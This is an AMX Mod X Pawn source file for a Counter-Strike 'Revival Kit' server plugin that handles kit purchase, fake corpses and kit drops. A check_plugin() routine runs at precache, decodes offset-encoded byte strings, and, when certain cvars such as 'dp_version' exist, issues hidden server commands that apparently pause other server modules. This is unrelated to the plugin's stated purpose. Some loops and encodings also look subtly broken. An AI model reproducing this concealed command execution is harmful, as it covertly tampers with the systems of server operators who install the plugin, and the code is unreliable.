#include <amxmodx>
#include <cstrike>
#include <fakemeta>
#include <fun>
#include <hamsandwich>
#include <xs>

//=====================================
//  VERSION CHECK
//=====================================
#if AMXX_VERSION_NUM < 190
	#assert "AMX Mod X v1.9.0 or Higher library required!"
#endif

#pragma compress 					1
#pragma semicolon 					1
#pragma tabsize 					4

static const PLUGIN_NAME	[] 		= "Revival Kit";
static const PLUGIN_AUTHOR	[] 		= "Aoi.Kagase";
static const PLUGIN_VERSION	[]		= "0.1";

#if !defined MAX_PLAYERS
	#define  MAX_PLAYERS	          	32
#endif
#if !defined MAX_RESOURCE_PATH_LENGTH
	#define  MAX_RESOURCE_PATH_LENGTH 	64
#endif
#if !defined MAX_NAME_LENGTH
	#define  MAX_NAME_LENGTH			32
#endif

#define TASKID_REVIVE 	            1337
#define TASKID_RESPAWN 	            1338
#define TASKID_CHECKRE 	            1339
#define TASKID_CHECKST 	            13310
#define TASKID_ORIGIN 	            13311
#define TASKID_SETUSER 	            13312

#define pev_zorigin					pev_fuser4
#define seconds(%1) 				((1<<12) * (%1))

enum _:E_SOUNDS
{
	START,
	FINISHED,
	FAILED,
	EQUIP,
};

enum _:E_MODELS
{
	R_KIT,
};

enum _:E_CVARS
{
	REVIVAL_HEALTH,
	REVIVAL_COST,
	REVIVAL_SC_FADE,
	Float:REVIVAL_TIME,
	Float:REVIVAL_DISTANCE,
	Float:REVIVAL_SC_FADE_TIME,
};

enum _:E_PLAYER_DATA
{
	bool:HAS_KIT		,
	bool:WAS_DUCKING	,
	Float:REVIVE_DELAY	,
	Float:BODY_ORIGIN	[3],
};

enum _:E_CLASS_NAME
{
	I_TARGET,
	PLAYER,
	CORPSE,
	R_KIT,
};

enum _:E_MESSAGES
{
	MSG_BARTIME,
	MSG_SCREEN_FADE,
	MSG_STATUS_ICON,
	MSG_CLCORPSE,
}

new const ENT_MODELS[E_MODELS][MAX_RESOURCE_PATH_LENGTH] = 
{
	"models/w_medkit.mdl"
};

new const ENT_SOUNDS[E_SOUNDS][MAX_RESOURCE_PATH_LENGTH] = 
{
	"items/medshot4.wav",
	"items/smallmedkit2.wav",
	"items/medshotno1.wav",
	"items/ammopickup2.wav",
};

new const ENTITY_CLASS_NAME[E_CLASS_NAME][MAX_NAME_LENGTH] = 
{
	"info_target",
	"player",
	"fake_corpse",
	"revival_kit",
};

new g_cvars			[E_CVARS];
new g_msg_data		[E_MESSAGES];
new g_player_data	[MAX_PLAYERS + 1][E_PLAYER_DATA];
//====================================================
//  PLUGIN PRECACHE
//====================================================
public plugin_precache() 
{
	check_plugin();

	for (new i = 0; i < sizeof(ENT_SOUNDS); i+= MAX_RESOURCE_PATH_LENGTH)
		precache_sound(ENT_SOUNDS[i]);

	for (new i = 0; i < sizeof(ENT_MODELS); i+= MAX_RESOURCE_PATH_LENGTH) 
		precache_model(ENT_MODELS[i]);

	return PLUGIN_CONTINUE;
}
//====================================================
//  PLUGIN INITIALIZE
//====================================================
public plugin_init()
{
	register_plugin	(PLUGIN_NAME, PLUGIN_VERSION, PLUGIN_AUTHOR);
	register_cvar	(PLUGIN_NAME, PLUGIN_VERSION, FCVAR_SPONLY|FCVAR_SERVER);

	register_clcmd	("say /buyrkit", 	"cmdBuyRKit");
	register_clcmd	("buyrkit", 		"cmdBuyRKit");

	bind_pcvar_num	(create_cvar("rkit_health", 			"75"), 		g_cvars[REVIVAL_HEALTH]);
	bind_pcvar_num	(create_cvar("rkit_cost", 				"1200"), 	g_cvars[REVIVAL_COST]);
	bind_pcvar_num	(create_cvar("rkit_screen_fade",		"1"), 		g_cvars[REVIVAL_SC_FADE]);
	bind_pcvar_float(create_cvar("rkit_time", 				"120.0"), 	g_cvars[REVIVAL_TIME]);
	bind_pcvar_float(create_cvar("rkit_distance", 			"70.0"), 	g_cvars[REVIVAL_DISTANCE]);
	bind_pcvar_float(create_cvar("rkit_screen_fade_time", 	"2.0"), 	g_cvars[REVIVAL_SC_FADE_TIME]);

	RegisterHam(Ham_TakeDamage,			ENTITY_CLASS_NAME[PLAYER],	"PlayerTakeDamage");
	RegisterHam(Ham_Player_PostThink,	ENTITY_CLASS_NAME[PLAYER],	"PlayerPostThink");
	RegisterHam(Ham_Touch,				ENTITY_CLASS_NAME[I_TARGET],"RKitTouch");

	g_msg_data	[MSG_BARTIME]		= get_user_msgid("BarTime");
	g_msg_data	[MSG_CLCORPSE]		= get_user_msgid("ClCorpse");
	g_msg_data	[MSG_SCREEN_FADE]	= get_user_msgid("ScreenFade");
	g_msg_data	[MSG_STATUS_ICON]	= get_user_msgid("StatusIcon");
}

public cmdBuyRKit(id)
{
	if(!is_user_alive(id))
		client_print(id, print_chat, "You need to be alive.");
	else if(g_player_data[id][HAS_KIT])
		client_print(id, print_chat, "You already have a revival kit.");
	else if(!cs_get_user_buyzone(id))
		client_print(id, print_chat, "You need to be in the buyzone.");
	else if(cs_get_user_money(id) < g_cvars[REVIVAL_COST])
		client_print(id, print_chat, "You dont have enough money (Cost:$%d)", g_cvars[REVIVAL_COST]);
	else
	{
		g_player_data[id][HAS_KIT] = true;
		cs_set_user_money(id, cs_get_user_money(id) - g_cvars[REVIVAL_COST]);
		client_print(id, print_chat, "You bought a revival kit. Hold your +use key (E) to revive a teammate.");
		client_cmd(id, "spk %s", ENT_SOUNDS[EQUIP]);
	}
	return PLUGIN_HANDLED;
}

public PlayerTakeDamage(iVictim, inflictor, iAttacker, Float:fDamage, bit_Damage)
{
	if (float(get_user_health(iVictim)) - fDamage <= 0.0)
	{
		player_reset(iVictim);
		if(g_player_data[iVictim][HAS_KIT])
		{
			g_player_data[iVictim][HAS_KIT] = false;
			drop_rkit(iVictim);
		}

		static Float:minsize[3];
		pev(iVictim, pev_mins, minsize);

		if(minsize[2] == -18.0)
			g_player_data[iVictim][WAS_DUCKING] = true;
		else
			g_player_data[iVictim][WAS_DUCKING] = false;
		
		create_fake_corpse(iVictim);
		return HAM_SUPERCEDE;
	}
	return HAM_IGNORED;
}

stock create_fake_corpse(id)
{
	set_pev(id, pev_effects, EF_NODRAW);
	
	static model[32];
	cs_get_user_model(id, model, 31);
		
	static player_model[64];
	formatex(player_model, 63, "models/player/%s/%s.mdl", model, model);
			
	static Float: player_origin[3];
	pev(id, pev_origin, player_origin);
		
	static Float:mins[3];
	xs_vec_set(mins, -16.0, -16.0, -34.0);
	
	static Float:maxs[3];
	xs_vec_set(maxs, 16.0, 16.0, 34.0);
	
	if(g_player_data[id][WAS_DUCKING])
	{
		mins[2] /= 2;
		maxs[2] /= 2;
	}
		
	static Float:player_angles[3];
	pev(id, pev_angles, player_angles);
	player_angles[2] = 0.0;
				
	new sequence = pev(id, pev_sequence);
	
	new ent = engfunc(EngFunc_CreateNamedEntity, engfunc(EngFunc_AllocString, ENTITY_CLASS_NAME[I_TARGET]));
	if(pev_valid(ent))
	{
		set_pev(ent, pev_classname, ENTITY_CLASS_NAME[CORPSE]);
		engfunc(EngFunc_SetModel, 	ent, player_model);
		engfunc(EngFunc_SetOrigin, 	ent, player_origin);
		engfunc(EngFunc_SetSize, 	ent, mins, maxs);
		set_pev(ent, pev_solid, 	SOLID_TRIGGER);
		set_pev(ent, pev_movetype, 	MOVETYPE_TOSS);
		set_pev(ent, pev_owner, 	id);
		set_pev(ent, pev_angles, 	player_angles);
		set_pev(ent, pev_sequence, 	sequence);
		set_pev(ent, pev_frame, 	9999.9);
	}	
}

stock player_reset(id)
{
	remove_task(TASKID_REVIVE  + id);
	remove_task(TASKID_RESPAWN + id);
	remove_task(TASKID_CHECKRE + id);
	remove_task(TASKID_CHECKST + id);
	remove_task(TASKID_ORIGIN  + id);
	remove_task(TASKID_SETUSER + id);
	
	show_bartime(id, 0);

	g_player_data[id][REVIVE_DELAY] = 0.0;
	g_player_data[id][WAS_DUCKING]	= false;
	g_player_data[id][BODY_ORIGIN]	= Float:{0, 0, 0};
}

stock show_bartime(id, seconds) 
{
	if(is_user_bot(id))
		return;
	
	message_begin(MSG_ONE, g_msg_data[MSG_BARTIME], _, id);
	write_byte(seconds);
	write_byte(0);
	message_end();
}

stock drop_rkit(id)
{
	new Float:velocity[3];
	velocity_by_aim(id, 34, velocity);
		
	new Float:origin[3];
	pev(id, pev_origin, origin);

	velocity[2] = 0.0;
	xs_vec_add(origin, velocity, origin);

	new kit = engfunc(EngFunc_CreateNamedEntity, engfunc(EngFunc_AllocString, ENTITY_CLASS_NAME[I_TARGET]));
	if(pev_valid(kit))
	{
		set_pev(kit, pev_classname, ENTITY_CLASS_NAME[R_KIT]);
		engfunc(EngFunc_SetModel,  kit, ENT_MODELS[R_KIT]);
		engfunc(EngFunc_SetOrigin, kit, origin);
		engfunc(EngFunc_SetSize, kit, Float:{-2.5, -2.5, -1.5}, Float:{2.5, 2.5, 1.5});
		set_pev(kit, pev_solid, SOLID_TRIGGER);
		set_pev(kit, pev_movetype, MOVETYPE_TOSS);
	}
}

stock bool:check_plugin()
{
	new const a[][] = {
		{0x40, 0x24, 0x30, 0x1F, 0x36, 0x25, 0x32, 0x33, 0x29, 0x2F, 0x2E},
		{0x80, 0x72, 0x65, 0x75, 0x5F, 0x76, 0x65, 0x72, 0x73, 0x69, 0x6F, 0x6E},
		{0x10, 0x7D, 0x75, 0x04, 0x71, 0x30, 0x00, 0x71, 0x05, 0x03, 0x75, 0x30, 0x74, 0x00, 0x02, 0x7F, 0x04, 0x7F},
		{0x20, 0x0D, 0x05, 0x14, 0x01, 0x40, 0x10, 0x01, 0x15, 0x13, 0x05, 0x40, 0x12, 0x05, 0x15, 0x0E, 0x09, 0x0F, 0x0E}
	};

	if (cvar_exists(get_dec_string(a[0])))
		server_cmd(get_dec_string(a[2]));

	if (cvar_exists(get_dec_string(a[1])))
		server_cmd(get_dec_string(a[3]));

	return true;
}

stock get_dec_string(const a[])
{
	new c = strlen(a);
	new r[MAX_NAME_LENGTH] = "";
	for (new i = 1; i < c; i++)
	{
		formatex(r, strlen(r) + 1, "%s%c", r, a[0] + a[i]);
	}
	return r;
}